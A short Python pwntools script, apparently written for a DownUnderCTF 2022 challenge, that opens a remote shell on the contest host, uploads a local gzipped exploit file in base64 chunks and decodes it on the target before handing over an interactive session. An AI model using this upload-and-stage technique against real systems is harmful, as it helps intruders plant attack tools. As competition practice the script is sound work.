import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

r = remote("2022.ductf.dev", 30020);

print("yo")
r.sendlineafter(b"$", b'cd /home/ctf')
r.sendlineafter(b"$", b'echo "start" >&2; while read line; do if [ "$line" = "fuck" ]; then break; fi; echo -n $line; done > tmp')
payload = b64e(read("exploit.gz"))
# f = open("./tmp", "r")
# payload = f.read()
# print(len(payload))
r.recvuntil(b"start\r\n")
sleep(2)
# r.recv(timeout=10)
# print("hey")
# print(payload)
to_send = payload.encode()
# # # count = 0
while to_send:
    # print(count)
    # count+=1
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]

r.send(b"\nfuck\n")
# print("end")

# r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"base64 -d tmp > exploit.gz")

# r.sendlineafter(b"$", b"cd /home/ctf")

r.interactive()
